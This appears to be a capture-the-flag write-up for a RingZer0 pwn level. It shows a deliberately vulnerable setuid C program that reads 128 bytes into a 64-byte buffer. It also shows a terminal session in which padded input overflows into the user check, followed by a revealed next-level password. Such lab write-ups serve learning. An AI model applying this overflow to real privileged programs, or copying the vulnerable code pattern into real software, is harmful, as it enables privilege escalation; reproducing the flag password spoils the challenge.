# Performing BufferOverflow to find flag
## My Approach:

### Code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct USER {
        int id;
        char name[32];
        char pass[32];
} u = { 0, "nobody", "Ksdkjkk32avsh" };

int main(int argc, char **argv)
{
        char user[32];
        char pass[32];
        char command[64];
        char *shell[] = { command, 0 };
        char *p;

        printf("Username: ");
        fgets(user, 31, stdin);
        p = strchr(user, '\n');
        if (p)
                *p = '\0';
        if (strcmp(user, u.name))
                return 0;
        printf("Password: ");
        fgets(pass, 31, stdin);
        p = strchr(pass, '\n');
        if (p)
                *p = '\0';
        if (strcmp(pass, u.pass))
                return 0;
        printf("Command: ");
        if (fgets(command, 128, stdin) == NULL)
                return 0;
        p = strchr(command, '\n');
        if (p)
                *p = '\0';
        if (!strcmp(user, "root")) {
                printf("Good job!\n");
                printf("command: %s\n", command);
                setresuid(geteuid(), geteuid(), geteuid());
                execve(shell[0],shell,0);
        }
        else {
                printf("Okay Mr. %s. Dropping priviledges though.\n", user);
                setreuid(getuid(), getuid());
                execve(shell[0],shell,0);
        }
        return 0;
}
```

As we can see from the code, there is no usage of strcpy like the precious challenge. Then how do we exploit it? 

If we look closely, we can see that the code given declares an array of size 64 but while reading data into the array it reads 128 bits instead of 64. We can use this to our benefit to exploit this code.
The command execve can help us retrieve the password for the next level, the only question is how do we reach it?

The code has half of the solution for us, if we just follow the following we can reach the section where our desired command is taken in by the program:

```
level2@lxc-pwn-x86:/levels$ ./level2
Username: nobody
Password: Ksdkjkk32avsh
Command: /bin/bash
Okay Mr. nobody. Dropping privileges though.
level2@lxc-pwn-x86:/levels$
```

If we put try to overflow the command buffer we might be able to execute the command we want. I tried the following method to get an idea of how to go about it:
```
level2@lxc-pwn-x86:/levels$ ./level2
Username: nobody
Password: Ksdkjkk32avsh
Command: /bin/bash
Okay Mr. nobody. Dropping privileges though.
level2@lxc-pwn-x86:/levels$ ./level2
Username: nobody
Password: Ksdkjkk32avsh
Command: /bin/bash0rootrootrootrootrootrootrootrootrootrootrootrootrootrootrootrootrootrootrootrootrootroroot
Good job!
level2@lxc-pwn-x86:/levels$
```

We got the code to print 'Good Job' but it doesn't execute our command. At this point, I tried multiple things and wasn't sure how to head forward. Then I asked for a hint in the Discord groups for RingZer0.
Someone there suggested that /tmp folder is writeable for a reason. 

This gave me all the hints that I needed. I then wrote a script in the tmp folder, made it executable, and then ran the following command and got the password for the next level:

![Screenshot 2022-01-16 132947](https://user-images.githubusercontent.com/19536413/149678453-564d9e45-006b-4aed-a7b0-dd0126d05263.png)

We have found the password for the next level. 
## Password is: b130hOOfGftXUfmRZlgD
